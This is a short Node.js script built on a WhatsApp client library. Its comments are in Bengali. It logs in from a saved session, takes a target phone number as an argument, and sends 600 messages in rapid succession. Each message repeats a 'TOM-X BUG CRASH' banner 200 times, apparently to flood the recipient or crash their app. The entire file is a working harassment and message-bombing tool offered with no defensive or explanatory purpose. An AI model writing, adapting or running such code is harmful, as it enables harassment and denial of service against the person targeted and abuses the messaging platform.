const { default: makeWASocket, useMultiFileAuthState, delay } = require("@whiskeysockets/baileys");

async function startSpam() {
    const { state } = await useMultiFileAuthState('session'); // সেশন থেকে কানেক্ট হবে
    const sock = makeWASocket({ auth: state });
    const target = process.argv[2]; // পাইথন থেকে নাম্বার নিবে

    sock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            for (let i = 0; i < 600; i++) {
                await sock.sendMessage(target + "@s.whatsapp.net", { 
                    text: "☣️ *TOM-X BUG CRASH* ☣️\n".repeat(200) 
                });
                await delay(100);
            }
            process.exit(0);
        }
    });
}
startSpam();
